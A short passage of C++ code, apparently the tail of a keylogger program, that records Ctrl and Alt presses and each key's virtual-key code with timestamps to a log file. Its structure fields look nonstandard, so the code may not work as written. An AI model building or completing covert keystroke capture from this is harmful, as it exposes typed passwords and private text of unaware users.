            logfile << "[" << std::ctime(&keyboardInput.time) << "] Ctrl pressed\n";
        }
        if (keyboardInput.state & (1 << 2)) { // Check if Alt pressed
            logfile << "[" << std::ctime(&keyboardInput.time) << "] Alt pressed\n";
        }
        // Check if the key is a regular key
        if (keyboardInput.vkey > 0 && keyboardInput.vkey <= 0xFF) {
            logfile << "[" << std::ctime(&keyboardInput.time) << "] Key: " << static_cast<int>(keyboardInput.vkey) << "\n";
        }
    }
    return 0;
}
```

